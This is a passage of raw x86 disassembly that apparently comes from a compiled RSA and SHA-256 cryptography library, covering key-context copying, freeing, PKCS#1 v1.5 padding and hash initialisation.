  407606:	c1 e8 03             	shr    $0x3,%eax
  407609:	89 47 04             	mov    %eax,0x4(%edi)
  40760c:	5d                   	pop    %ebp
  40760d:	5b                   	pop    %ebx
  40760e:	8d 44 24 08          	lea    0x8(%esp),%eax
  407612:	50                   	push   %eax
  407613:	e8 a8 c3 ff ff       	call   0x4039c0
  407618:	8d 44 24 14          	lea    0x14(%esp),%eax
  40761c:	50                   	push   %eax
  40761d:	e8 9e c3 ff ff       	call   0x4039c0
  407622:	8d 44 24 20          	lea    0x20(%esp),%eax
  407626:	50                   	push   %eax
  407627:	e8 94 c3 ff ff       	call   0x4039c0
  40762c:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  407630:	50                   	push   %eax
  407631:	e8 8a c3 ff ff       	call   0x4039c0
  407636:	85 f6                	test   %esi,%esi
  407638:	74 0e                	je     0x407648
  40763a:	57                   	push   %edi
  40763b:	e8 b1 01 00 00       	call   0x4077f1
  407640:	8d 86 80 be ff ff    	lea    -0x4180(%esi),%eax
  407646:	eb 09                	jmp    0x407651
  407648:	33 c0                	xor    %eax,%eax
  40764a:	eb 05                	jmp    0x407651
  40764c:	b8 80 bf ff ff       	mov    $0xffffbf80,%eax
  407651:	5f                   	pop    %edi
  407652:	5e                   	pop    %esi
  407653:	83 c4 30             	add    $0x30,%esp
  407656:	c2 14 00             	ret    $0x14
  407659:	55                   	push   %ebp
  40765a:	8b ec                	mov    %esp,%ebp
  40765c:	8b 45 08             	mov    0x8(%ebp),%eax
  40765f:	83 b8 a4 00 00 00 00 	cmpl   $0x0,0xa4(%eax)
  407666:	74 07                	je     0x40766f
  407668:	b8 00 bf ff ff       	mov    $0xffffbf00,%eax
  40766d:	eb 18                	jmp    0x407687
  40766f:	ff 75 20             	push   0x20(%ebp)
  407672:	ff 75 1c             	push   0x1c(%ebp)
  407675:	ff 75 18             	push   0x18(%ebp)
  407678:	ff 75 14             	push   0x14(%ebp)
  40767b:	ff 75 10             	push   0x10(%ebp)
  40767e:	ff 75 0c             	push   0xc(%ebp)
  407681:	50                   	push   %eax
  407682:	e8 b0 04 00 00       	call   0x407b37
  407687:	5d                   	pop    %ebp
  407688:	c2 1c 00             	ret    $0x1c
  40768b:	53                   	push   %ebx
  40768c:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  407690:	56                   	push   %esi
  407691:	57                   	push   %edi
  407692:	8b 7c 24 10          	mov    0x10(%esp),%edi
  407696:	8b 03                	mov    (%ebx),%eax
  407698:	89 07                	mov    %eax,(%edi)
  40769a:	8b 43 04             	mov    0x4(%ebx),%eax
  40769d:	89 47 04             	mov    %eax,0x4(%edi)
  4076a0:	8d 43 08             	lea    0x8(%ebx),%eax
  4076a3:	50                   	push   %eax
  4076a4:	8d 47 08             	lea    0x8(%edi),%eax
  4076a7:	50                   	push   %eax
  4076a8:	e8 3d c4 ff ff       	call   0x403aea
  4076ad:	8b f0                	mov    %eax,%esi
  4076af:	85 f6                	test   %esi,%esi
  4076b1:	0f 85 2c 01 00 00    	jne    0x4077e3
  4076b7:	8d 43 14             	lea    0x14(%ebx),%eax
  4076ba:	50                   	push   %eax
  4076bb:	8d 47 14             	lea    0x14(%edi),%eax
  4076be:	50                   	push   %eax
  4076bf:	e8 26 c4 ff ff       	call   0x403aea
  4076c4:	8b f0                	mov    %eax,%esi
  4076c6:	85 f6                	test   %esi,%esi
  4076c8:	0f 85 15 01 00 00    	jne    0x4077e3
  4076ce:	8d 43 20             	lea    0x20(%ebx),%eax
  4076d1:	50                   	push   %eax
  4076d2:	8d 47 20             	lea    0x20(%edi),%eax
  4076d5:	50                   	push   %eax
  4076d6:	e8 0f c4 ff ff       	call   0x403aea
  4076db:	8b f0                	mov    %eax,%esi
  4076dd:	85 f6                	test   %esi,%esi
  4076df:	0f 85 fe 00 00 00    	jne    0x4077e3
  4076e5:	8d 43 2c             	lea    0x2c(%ebx),%eax
  4076e8:	50                   	push   %eax
  4076e9:	8d 47 2c             	lea    0x2c(%edi),%eax
  4076ec:	50                   	push   %eax
  4076ed:	e8 f8 c3 ff ff       	call   0x403aea
  4076f2:	8b f0                	mov    %eax,%esi
  4076f4:	85 f6                	test   %esi,%esi
  4076f6:	0f 85 e7 00 00 00    	jne    0x4077e3
  4076fc:	8d 43 38             	lea    0x38(%ebx),%eax
  4076ff:	50                   	push   %eax
  407700:	8d 47 38             	lea    0x38(%edi),%eax
  407703:	50                   	push   %eax
  407704:	e8 e1 c3 ff ff       	call   0x403aea
  407709:	8b f0                	mov    %eax,%esi
  40770b:	85 f6                	test   %esi,%esi
  40770d:	0f 85 d0 00 00 00    	jne    0x4077e3
  407713:	8d 43 44             	lea    0x44(%ebx),%eax
  407716:	50                   	push   %eax
  407717:	8d 47 44             	lea    0x44(%edi),%eax
  40771a:	50                   	push   %eax
  40771b:	e8 ca c3 ff ff       	call   0x403aea
  407720:	8b f0                	mov    %eax,%esi
  407722:	85 f6                	test   %esi,%esi
  407724:	0f 85 b9 00 00 00    	jne    0x4077e3
  40772a:	8d 43 50             	lea    0x50(%ebx),%eax
  40772d:	50                   	push   %eax
  40772e:	8d 47 50             	lea    0x50(%edi),%eax
  407731:	50                   	push   %eax
  407732:	e8 b3 c3 ff ff       	call   0x403aea
  407737:	8b f0                	mov    %eax,%esi
  407739:	85 f6                	test   %esi,%esi
  40773b:	0f 85 a2 00 00 00    	jne    0x4077e3
  407741:	8d 43 5c             	lea    0x5c(%ebx),%eax
  407744:	50                   	push   %eax
  407745:	8d 47 5c             	lea    0x5c(%edi),%eax
  407748:	50                   	push   %eax
  407749:	e8 9c c3 ff ff       	call   0x403aea
  40774e:	8b f0                	mov    %eax,%esi
  407750:	85 f6                	test   %esi,%esi
  407752:	0f 85 8b 00 00 00    	jne    0x4077e3
  407758:	8d 43 68             	lea    0x68(%ebx),%eax
  40775b:	50                   	push   %eax
  40775c:	8d 47 68             	lea    0x68(%edi),%eax
  40775f:	50                   	push   %eax
  407760:	e8 85 c3 ff ff       	call   0x403aea
  407765:	8b f0                	mov    %eax,%esi
  407767:	85 f6                	test   %esi,%esi
  407769:	75 78                	jne    0x4077e3
  40776b:	8d 43 74             	lea    0x74(%ebx),%eax
  40776e:	50                   	push   %eax
  40776f:	8d 47 74             	lea    0x74(%edi),%eax
  407772:	50                   	push   %eax
  407773:	e8 72 c3 ff ff       	call   0x403aea
  407778:	8b f0                	mov    %eax,%esi
  40777a:	85 f6                	test   %esi,%esi
  40777c:	75 65                	jne    0x4077e3
  40777e:	8d 83 80 00 00 00    	lea    0x80(%ebx),%eax
  407784:	50                   	push   %eax
  407785:	8d 87 80 00 00 00    	lea    0x80(%edi),%eax
  40778b:	50                   	push   %eax
  40778c:	e8 59 c3 ff ff       	call   0x403aea
  407791:	8b f0                	mov    %eax,%esi
  407793:	85 f6                	test   %esi,%esi
  407795:	75 4c                	jne    0x4077e3
  407797:	8d 83 8c 00 00 00    	lea    0x8c(%ebx),%eax
  40779d:	50                   	push   %eax
  40779e:	8d 87 8c 00 00 00    	lea    0x8c(%edi),%eax
  4077a4:	50                   	push   %eax
  4077a5:	e8 40 c3 ff ff       	call   0x403aea
  4077aa:	8b f0                	mov    %eax,%esi
  4077ac:	85 f6                	test   %esi,%esi
  4077ae:	75 33                	jne    0x4077e3
  4077b0:	8d 83 98 00 00 00    	lea    0x98(%ebx),%eax
  4077b6:	50                   	push   %eax
  4077b7:	8d 87 98 00 00 00    	lea    0x98(%edi),%eax
  4077bd:	50                   	push   %eax
  4077be:	e8 27 c3 ff ff       	call   0x403aea
  4077c3:	8b f0                	mov    %eax,%esi
  4077c5:	85 f6                	test   %esi,%esi
  4077c7:	75 1a                	jne    0x4077e3
  4077c9:	8b 83 a4 00 00 00    	mov    0xa4(%ebx),%eax
  4077cf:	89 87 a4 00 00 00    	mov    %eax,0xa4(%edi)
  4077d5:	8b 83 a8 00 00 00    	mov    0xa8(%ebx),%eax
  4077db:	89 87 a8 00 00 00    	mov    %eax,0xa8(%edi)
  4077e1:	eb 06                	jmp    0x4077e9
  4077e3:	57                   	push   %edi
  4077e4:	e8 08 00 00 00       	call   0x4077f1
  4077e9:	5f                   	pop    %edi
  4077ea:	8b c6                	mov    %esi,%eax
  4077ec:	5e                   	pop    %esi
  4077ed:	5b                   	pop    %ebx
  4077ee:	c2 08 00             	ret    $0x8
  4077f1:	56                   	push   %esi
  4077f2:	8b 74 24 08          	mov    0x8(%esp),%esi
  4077f6:	8d 86 8c 00 00 00    	lea    0x8c(%esi),%eax
  4077fc:	50                   	push   %eax
  4077fd:	e8 be c1 ff ff       	call   0x4039c0
  407802:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
  407808:	50                   	push   %eax
  407809:	e8 b2 c1 ff ff       	call   0x4039c0
  40780e:	8d 86 80 00 00 00    	lea    0x80(%esi),%eax
  407814:	50                   	push   %eax
  407815:	e8 a6 c1 ff ff       	call   0x4039c0
  40781a:	8d 46 74             	lea    0x74(%esi),%eax
  40781d:	50                   	push   %eax
  40781e:	e8 9d c1 ff ff       	call   0x4039c0
  407823:	8d 46 68             	lea    0x68(%esi),%eax
  407826:	50                   	push   %eax
  407827:	e8 94 c1 ff ff       	call   0x4039c0
  40782c:	8d 46 5c             	lea    0x5c(%esi),%eax
  40782f:	50                   	push   %eax
  407830:	e8 8b c1 ff ff       	call   0x4039c0
  407835:	8d 46 50             	lea    0x50(%esi),%eax
  407838:	50                   	push   %eax
  407839:	e8 82 c1 ff ff       	call   0x4039c0
  40783e:	8d 46 44             	lea    0x44(%esi),%eax
  407841:	50                   	push   %eax
  407842:	e8 79 c1 ff ff       	call   0x4039c0
  407847:	8d 46 38             	lea    0x38(%esi),%eax
  40784a:	50                   	push   %eax
  40784b:	e8 70 c1 ff ff       	call   0x4039c0
  407850:	8d 46 2c             	lea    0x2c(%esi),%eax
  407853:	50                   	push   %eax
  407854:	e8 67 c1 ff ff       	call   0x4039c0
  407859:	8d 46 20             	lea    0x20(%esi),%eax
  40785c:	50                   	push   %eax
  40785d:	e8 5e c1 ff ff       	call   0x4039c0
  407862:	8d 46 14             	lea    0x14(%esi),%eax
  407865:	50                   	push   %eax
  407866:	e8 55 c1 ff ff       	call   0x4039c0
  40786b:	8d 46 08             	lea    0x8(%esi),%eax
  40786e:	50                   	push   %eax
  40786f:	e8 4c c1 ff ff       	call   0x4039c0
  407874:	5e                   	pop    %esi
  407875:	c2 04 00             	ret    $0x4
  407878:	55                   	push   %ebp
  407879:	8b ec                	mov    %esp,%ebp
  40787b:	83 ec 0c             	sub    $0xc,%esp
  40787e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407881:	56                   	push   %esi
  407882:	57                   	push   %edi
  407883:	50                   	push   %eax
  407884:	e8 1e c1 ff ff       	call   0x4039a7
  407889:	8b 7d 08             	mov    0x8(%ebp),%edi
  40788c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40788f:	ff 77 04             	push   0x4(%edi)
  407892:	ff 75 0c             	push   0xc(%ebp)
  407895:	50                   	push   %eax
  407896:	e8 de c8 ff ff       	call   0x404179
  40789b:	8b f0                	mov    %eax,%esi
  40789d:	85 f6                	test   %esi,%esi
  40789f:	75 43                	jne    0x4078e4
  4078a1:	8d 77 08             	lea    0x8(%edi),%esi
  4078a4:	56                   	push   %esi
  4078a5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4078a8:	50                   	push   %eax
  4078a9:	e8 9d cb ff ff       	call   0x40444b
  4078ae:	85 c0                	test   %eax,%eax
  4078b0:	78 05                	js     0x4078b7
  4078b2:	6a fc                	push   $0xfffffffc
  4078b4:	5e                   	pop    %esi
  4078b5:	eb 2d                	jmp    0x4078e4
  4078b7:	53                   	push   %ebx
  4078b8:	8b 5f 04             	mov    0x4(%edi),%ebx
  4078bb:	8d 47 68             	lea    0x68(%edi),%eax
  4078be:	50                   	push   %eax
  4078bf:	56                   	push   %esi
  4078c0:	8d 47 14             	lea    0x14(%edi),%eax
  4078c3:	50                   	push   %eax
  4078c4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4078c7:	50                   	push   %eax
  4078c8:	50                   	push   %eax
  4078c9:	e8 e4 d5 ff ff       	call   0x404eb2
  4078ce:	8b f0                	mov    %eax,%esi
  4078d0:	85 f6                	test   %esi,%esi
  4078d2:	75 0f                	jne    0x4078e3
  4078d4:	53                   	push   %ebx
  4078d5:	ff 75 10             	push   0x10(%ebp)
  4078d8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4078db:	50                   	push   %eax
  4078dc:	e8 1e c9 ff ff       	call   0x4041ff
  4078e1:	8b f0                	mov    %eax,%esi
  4078e3:	5b                   	pop    %ebx
  4078e4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4078e7:	50                   	push   %eax
  4078e8:	e8 d3 c0 ff ff       	call   0x4039c0
  4078ed:	85 f6                	test   %esi,%esi
  4078ef:	74 08                	je     0x4078f9
  4078f1:	8d 86 80 bd ff ff    	lea    -0x4280(%esi),%eax
  4078f7:	eb 02                	jmp    0x4078fb
  4078f9:	33 c0                	xor    %eax,%eax
  4078fb:	5f                   	pop    %edi
  4078fc:	5e                   	pop    %esi
  4078fd:	8b e5                	mov    %ebp,%esp
  4078ff:	5d                   	pop    %ebp
  407900:	c2 0c 00             	ret    $0xc
  407903:	53                   	push   %ebx
  407904:	55                   	push   %ebp
  407905:	56                   	push   %esi
  407906:	8b 74 24 10          	mov    0x10(%esp),%esi
  40790a:	57                   	push   %edi
  40790b:	33 ff                	xor    %edi,%edi
  40790d:	39 be a0 00 00 00    	cmp    %edi,0xa0(%esi)
  407913:	74 49                	je     0x40795e
  407915:	8d be 8c 00 00 00    	lea    0x8c(%esi),%edi
  40791b:	57                   	push   %edi
  40791c:	57                   	push   %edi
  40791d:	57                   	push   %edi
  40791e:	e8 9c ce ff ff       	call   0x4047bf
  407923:	85 c0                	test   %eax,%eax
  407925:	0f 85 ab 00 00 00    	jne    0x4079d6
  40792b:	8d 5e 08             	lea    0x8(%esi),%ebx
  40792e:	53                   	push   %ebx
  40792f:	57                   	push   %edi
  407930:	57                   	push   %edi
  407931:	e8 6c d4 ff ff       	call   0x404da2
  407936:	85 c0                	test   %eax,%eax
  407938:	0f 85 98 00 00 00    	jne    0x4079d6
  40793e:	81 c6 98 00 00 00    	add    $0x98,%esi
  407944:	56                   	push   %esi
  407945:	56                   	push   %esi
  407946:	56                   	push   %esi
  407947:	e8 73 ce ff ff       	call   0x4047bf
  40794c:	85 c0                	test   %eax,%eax
  40794e:	0f 85 82 00 00 00    	jne    0x4079d6
  407954:	53                   	push   %ebx
  407955:	56                   	push   %esi
  407956:	56                   	push   %esi
  407957:	e8 46 d4 ff ff       	call   0x404da2
  40795c:	eb 78                	jmp    0x4079d6
  40795e:	8b c7                	mov    %edi,%eax
  407960:	47                   	inc    %edi
  407961:	83 f8 0a             	cmp    $0xa,%eax
  407964:	7f 6b                	jg     0x4079d1
  407966:	ff 74 24 1c          	push   0x1c(%esp)
  40796a:	8b 46 04             	mov    0x4(%esi),%eax
  40796d:	8d ae 98 00 00 00    	lea    0x98(%esi),%ebp
  407973:	ff 74 24 1c          	push   0x1c(%esp)
  407977:	48                   	dec    %eax
  407978:	50                   	push   %eax
  407979:	55                   	push   %ebp
  40797a:	e8 de da ff ff       	call   0x40545d
  40797f:	85 c0                	test   %eax,%eax
  407981:	75 53                	jne    0x4079d6
  407983:	8d 46 08             	lea    0x8(%esi),%eax
  407986:	50                   	push   %eax
  407987:	55                   	push   %ebp
  407988:	8d 9e 8c 00 00 00    	lea    0x8c(%esi),%ebx
  40798e:	53                   	push   %ebx
  40798f:	e8 0c db ff ff       	call   0x4054a0
  407994:	85 c0                	test   %eax,%eax
  407996:	75 3e                	jne    0x4079d6
  407998:	6a 01                	push   $0x1
  40799a:	53                   	push   %ebx
  40799b:	e8 43 cb ff ff       	call   0x4044e3
  4079a0:	85 c0                	test   %eax,%eax
  4079a2:	75 ba                	jne    0x40795e
  4079a4:	8d 5e 08             	lea    0x8(%esi),%ebx
  4079a7:	53                   	push   %ebx
  4079a8:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
  4079ae:	50                   	push   %eax
  4079af:	8d be 8c 00 00 00    	lea    0x8c(%esi),%edi
  4079b5:	57                   	push   %edi
  4079b6:	e8 60 dc ff ff       	call   0x40561b
  4079bb:	85 c0                	test   %eax,%eax
  4079bd:	75 17                	jne    0x4079d6
  4079bf:	8d 46 68             	lea    0x68(%esi),%eax
  4079c2:	50                   	push   %eax
  4079c3:	53                   	push   %ebx
  4079c4:	8d 46 14             	lea    0x14(%esi),%eax
  4079c7:	50                   	push   %eax
  4079c8:	57                   	push   %edi
  4079c9:	57                   	push   %edi
  4079ca:	e8 e3 d4 ff ff       	call   0x404eb2
  4079cf:	eb 05                	jmp    0x4079d6
  4079d1:	b8 80 bb ff ff       	mov    $0xffffbb80,%eax
  4079d6:	5f                   	pop    %edi
  4079d7:	5e                   	pop    %esi
  4079d8:	5d                   	pop    %ebp
  4079d9:	5b                   	pop    %ebx
  4079da:	c2 0c 00             	ret    $0xc
  4079dd:	83 ec 24             	sub    $0x24,%esp
  4079e0:	33 c0                	xor    %eax,%eax
  4079e2:	56                   	push   %esi
  4079e3:	57                   	push   %edi
  4079e4:	8b 7c 24 30          	mov    0x30(%esp),%edi
  4079e8:	39 47 34             	cmp    %eax,0x34(%edi)
  4079eb:	0f 84 39 01 00 00    	je     0x407b2a
  4079f1:	39 47 40             	cmp    %eax,0x40(%edi)
  4079f4:	0f 84 30 01 00 00    	je     0x407b2a
  4079fa:	39 47 28             	cmp    %eax,0x28(%edi)
  4079fd:	0f 84 27 01 00 00    	je     0x407b2a
  407a03:	8d 44 24 08          	lea    0x8(%esp),%eax
  407a07:	50                   	push   %eax
  407a08:	e8 9a bf ff ff       	call   0x4039a7
  407a0d:	8d 44 24 14          	lea    0x14(%esp),%eax
  407a11:	50                   	push   %eax
  407a12:	e8 90 bf ff ff       	call   0x4039a7
  407a17:	8d 44 24 20          	lea    0x20(%esp),%eax
  407a1b:	50                   	push   %eax
  407a1c:	e8 86 bf ff ff       	call   0x4039a7
  407a21:	ff 77 04             	push   0x4(%edi)
  407a24:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407a28:	ff 74 24 40          	push   0x40(%esp)
  407a2c:	50                   	push   %eax
  407a2d:	e8 47 c7 ff ff       	call   0x404179
  407a32:	8b f0                	mov    %eax,%esi
  407a34:	85 f6                	test   %esi,%esi
  407a36:	0f 85 c0 00 00 00    	jne    0x407afc
  407a3c:	55                   	push   %ebp
  407a3d:	8d 6f 08             	lea    0x8(%edi),%ebp
  407a40:	55                   	push   %ebp
  407a41:	8d 44 24 10          	lea    0x10(%esp),%eax
  407a45:	50                   	push   %eax
  407a46:	e8 00 ca ff ff       	call   0x40444b
  407a4b:	85 c0                	test   %eax,%eax
  407a4d:	78 08                	js     0x407a57
  407a4f:	6a fc                	push   $0xfffffffc
  407a51:	5e                   	pop    %esi
  407a52:	e9 a4 00 00 00       	jmp    0x407afb
  407a57:	53                   	push   %ebx
  407a58:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  407a5c:	85 db                	test   %ebx,%ebx
  407a5e:	74 3f                	je     0x407a9f
  407a60:	ff 74 24 40          	push   0x40(%esp)
  407a64:	53                   	push   %ebx
  407a65:	57                   	push   %edi
  407a66:	e8 98 fe ff ff       	call   0x407903
  407a6b:	8b f0                	mov    %eax,%esi
  407a6d:	85 f6                	test   %esi,%esi
  407a6f:	0f 85 85 00 00 00    	jne    0x407afa
  407a75:	8d 87 8c 00 00 00    	lea    0x8c(%edi),%eax
  407a7b:	50                   	push   %eax
  407a7c:	8d 44 24 14          	lea    0x14(%esp),%eax
  407a80:	50                   	push   %eax
  407a81:	50                   	push   %eax
  407a82:	e8 38 cd ff ff       	call   0x4047bf
  407a87:	8b f0                	mov    %eax,%esi
  407a89:	85 f6                	test   %esi,%esi
  407a8b:	75 6d                	jne    0x407afa
  407a8d:	55                   	push   %ebp
  407a8e:	8d 44 24 14          	lea    0x14(%esp),%eax
  407a92:	50                   	push   %eax
  407a93:	50                   	push   %eax
  407a94:	e8 09 d3 ff ff       	call   0x404da2
  407a99:	8b f0                	mov    %eax,%esi
  407a9b:	85 f6                	test   %esi,%esi
  407a9d:	75 5b                	jne    0x407afa
  407a9f:	8d 47 68             	lea    0x68(%edi),%eax
  407aa2:	50                   	push   %eax
  407aa3:	55                   	push   %ebp
  407aa4:	8d 47 20             	lea    0x20(%edi),%eax
  407aa7:	50                   	push   %eax
  407aa8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  407aac:	50                   	push   %eax
  407aad:	50                   	push   %eax
  407aae:	e8 ff d3 ff ff       	call   0x404eb2
  407ab3:	8b f0                	mov    %eax,%esi
  407ab5:	85 f6                	test   %esi,%esi
  407ab7:	75 41                	jne    0x407afa
  407ab9:	85 db                	test   %ebx,%ebx
  407abb:	74 2a                	je     0x407ae7
  407abd:	8d 87 98 00 00 00    	lea    0x98(%edi),%eax
  407ac3:	50                   	push   %eax
  407ac4:	8d 44 24 14          	lea    0x14(%esp),%eax
  407ac8:	50                   	push   %eax
  407ac9:	50                   	push   %eax
  407aca:	e8 f0 cc ff ff       	call   0x4047bf
  407acf:	8b f0                	mov    %eax,%esi
  407ad1:	85 f6                	test   %esi,%esi
  407ad3:	75 25                	jne    0x407afa
  407ad5:	55                   	push   %ebp
  407ad6:	8d 44 24 14          	lea    0x14(%esp),%eax
  407ada:	50                   	push   %eax
  407adb:	50                   	push   %eax
  407adc:	e8 c1 d2 ff ff       	call   0x404da2
  407ae1:	8b f0                	mov    %eax,%esi
  407ae3:	85 f6                	test   %esi,%esi
  407ae5:	75 13                	jne    0x407afa
  407ae7:	ff 77 04             	push   0x4(%edi)
  407aea:	8d 44 24 14          	lea    0x14(%esp),%eax
  407aee:	ff 74 24 4c          	push   0x4c(%esp)
  407af2:	50                   	push   %eax
  407af3:	e8 07 c7 ff ff       	call   0x4041ff
  407af8:	8b f0                	mov    %eax,%esi
  407afa:	5b                   	pop    %ebx
  407afb:	5d                   	pop    %ebp
  407afc:	8d 44 24 08          	lea    0x8(%esp),%eax
  407b00:	50                   	push   %eax
  407b01:	e8 ba be ff ff       	call   0x4039c0
  407b06:	8d 44 24 14          	lea    0x14(%esp),%eax
  407b0a:	50                   	push   %eax
  407b0b:	e8 b0 be ff ff       	call   0x4039c0
  407b10:	8d 44 24 20          	lea    0x20(%esp),%eax
  407b14:	50                   	push   %eax
  407b15:	e8 a6 be ff ff       	call   0x4039c0
  407b1a:	85 f6                	test   %esi,%esi
  407b1c:	74 08                	je     0x407b26
  407b1e:	8d 86 00 bd ff ff    	lea    -0x4300(%esi),%eax
  407b24:	eb 09                	jmp    0x407b2f
  407b26:	33 c0                	xor    %eax,%eax
  407b28:	eb 05                	jmp    0x407b2f
  407b2a:	b8 80 bf ff ff       	mov    $0xffffbf80,%eax
  407b2f:	5f                   	pop    %edi
  407b30:	5e                   	pop    %esi
  407b31:	83 c4 24             	add    $0x24,%esp
  407b34:	c2 14 00             	ret    $0x14
  407b37:	83 7c 24 10 01       	cmpl   $0x1,0x10(%esp)
  407b3c:	55                   	push   %ebp
  407b3d:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  407b41:	56                   	push   %esi
  407b42:	57                   	push   %edi
  407b43:	75 13                	jne    0x407b58
  407b45:	83 bd a4 00 00 00 00 	cmpl   $0x0,0xa4(%ebp)
  407b4c:	74 0a                	je     0x407b58
  407b4e:	b8 80 bf ff ff       	mov    $0xffffbf80,%eax
  407b53:	e9 e9 00 00 00       	jmp    0x407c41
  407b58:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  407b5d:	53                   	push   %ebx
  407b5e:	0f 84 d7 00 00 00    	je     0x407c3b
  407b64:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  407b69:	0f 84 cc 00 00 00    	je     0x407c3b
  407b6f:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  407b73:	85 db                	test   %ebx,%ebx
  407b75:	0f 84 c0 00 00 00    	je     0x407c3b
  407b7b:	8b 74 24 24          	mov    0x24(%esp),%esi
  407b7f:	8b 7d 04             	mov    0x4(%ebp),%edi
  407b82:	8d 46 0b             	lea    0xb(%esi),%eax
  407b85:	3b c6                	cmp    %esi,%eax
  407b87:	0f 82 ae 00 00 00    	jb     0x407c3b
  407b8d:	3b f8                	cmp    %eax,%edi
  407b8f:	0f 82 a6 00 00 00    	jb     0x407c3b
  407b95:	2b fe                	sub    %esi,%edi
  407b97:	c6 03 00             	movb   $0x0,(%ebx)
  407b9a:	83 ef 03             	sub    $0x3,%edi
  407b9d:	8d 73 01             	lea    0x1(%ebx),%esi
  407ba0:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
  407ba5:	75 43                	jne    0x407bea
  407ba7:	c6 06 02             	movb   $0x2,(%esi)
  407baa:	eb 30                	jmp    0x407bdc
  407bac:	4f                   	dec    %edi
  407bad:	c7 44 24 14 64 00 00 	movl   $0x64,0x14(%esp)
  407bb4:	00 
  407bb5:	6a 01                	push   $0x1
  407bb7:	56                   	push   %esi
  407bb8:	ff 74 24 24          	push   0x24(%esp)
  407bbc:	ff 54 24 24          	call   *0x24(%esp)
  407bc0:	80 3e 00             	cmpb   $0x0,(%esi)
  407bc3:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  407bc7:	75 0b                	jne    0x407bd4
  407bc9:	49                   	dec    %ecx
  407bca:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  407bce:	74 13                	je     0x407be3
  407bd0:	85 c0                	test   %eax,%eax
  407bd2:	74 e1                	je     0x407bb5
  407bd4:	85 c9                	test   %ecx,%ecx
  407bd6:	74 0b                	je     0x407be3
  407bd8:	85 c0                	test   %eax,%eax
  407bda:	75 07                	jne    0x407be3
  407bdc:	46                   	inc    %esi
  407bdd:	85 ff                	test   %edi,%edi
  407bdf:	75 cb                	jne    0x407bac
  407be1:	eb 20                	jmp    0x407c03
  407be3:	05 80 bb ff ff       	add    $0xffffbb80,%eax
  407be8:	eb 56                	jmp    0x407c40
  407bea:	c6 06 01             	movb   $0x1,(%esi)
  407bed:	46                   	inc    %esi
  407bee:	85 ff                	test   %edi,%edi
  407bf0:	74 11                	je     0x407c03
  407bf2:	57                   	push   %edi
  407bf3:	68 ff 00 00 00       	push   $0xff
  407bf8:	56                   	push   %esi
  407bf9:	e8 49 aa ff ff       	call   0x402647
  407bfe:	83 c4 0c             	add    $0xc,%esp
  407c01:	03 f7                	add    %edi,%esi
  407c03:	ff 74 24 24          	push   0x24(%esp)
  407c07:	8d 46 01             	lea    0x1(%esi),%eax
  407c0a:	c6 06 00             	movb   $0x0,(%esi)
  407c0d:	ff 74 24 2c          	push   0x2c(%esp)
  407c11:	50                   	push   %eax
  407c12:	e8 0e aa ff ff       	call   0x402625
  407c17:	83 c4 0c             	add    $0xc,%esp
  407c1a:	83 7c 24 20 00       	cmpl   $0x0,0x20(%esp)
  407c1f:	53                   	push   %ebx
  407c20:	53                   	push   %ebx
  407c21:	75 08                	jne    0x407c2b
  407c23:	55                   	push   %ebp
  407c24:	e8 4f fc ff ff       	call   0x407878
  407c29:	eb 15                	jmp    0x407c40
  407c2b:	ff 74 24 24          	push   0x24(%esp)
  407c2f:	ff 74 24 24          	push   0x24(%esp)
  407c33:	55                   	push   %ebp
  407c34:	e8 a4 fd ff ff       	call   0x4079dd
  407c39:	eb 05                	jmp    0x407c40
  407c3b:	b8 80 bf ff ff       	mov    $0xffffbf80,%eax
  407c40:	5b                   	pop    %ebx
  407c41:	5f                   	pop    %edi
  407c42:	5e                   	pop    %esi
  407c43:	5d                   	pop    %ebp
  407c44:	c2 1c 00             	ret    $0x1c
  407c47:	6a 6c                	push   $0x6c
  407c49:	6a 00                	push   $0x0
  407c4b:	ff 74 24 0c          	push   0xc(%esp)
  407c4f:	e8 f3 a9 ff ff       	call   0x402647
  407c54:	83 c4 0c             	add    $0xc,%esp
  407c57:	c2 04 00             	ret    $0x4
  407c5a:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  407c5f:	74 0b                	je     0x407c6c
  407c61:	6a 6c                	push   $0x6c
  407c63:	ff 74 24 08          	push   0x8(%esp)
  407c67:	e8 cd 0c 00 00       	call   0x408939
  407c6c:	c2 04 00             	ret    $0x4
  407c6f:	56                   	push   %esi
  407c70:	8b 74 24 0c          	mov    0xc(%esp),%esi
  407c74:	57                   	push   %edi
  407c75:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  407c79:	6a 1b                	push   $0x1b
  407c7b:	59                   	pop    %ecx
  407c7c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407c7e:	5f                   	pop    %edi
  407c7f:	5e                   	pop    %esi
  407c80:	c2 08 00             	ret    $0x8
  407c83:	8b 44 24 04          	mov    0x4(%esp),%eax
  407c87:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  407c8b:	83 20 00             	andl   $0x0,(%eax)
  407c8e:	83 60 04 00          	andl   $0x0,0x4(%eax)
  407c92:	85 c9                	test   %ecx,%ecx
  407c94:	75 3a                	jne    0x407cd0
  407c96:	c7 40 08 67 e6 09 6a 	movl   $0x6a09e667,0x8(%eax)
  407c9d:	c7 40 0c 85 ae 67 bb 	movl   $0xbb67ae85,0xc(%eax)
  407ca4:	c7 40 10 72 f3 6e 3c 	movl   $0x3c6ef372,0x10(%eax)
  407cab:	c7 40 14 3a f5 4f a5 	movl   $0xa54ff53a,0x14(%eax)
  407cb2:	c7 40 18 7f 52 0e 51 	movl   $0x510e527f,0x18(%eax)
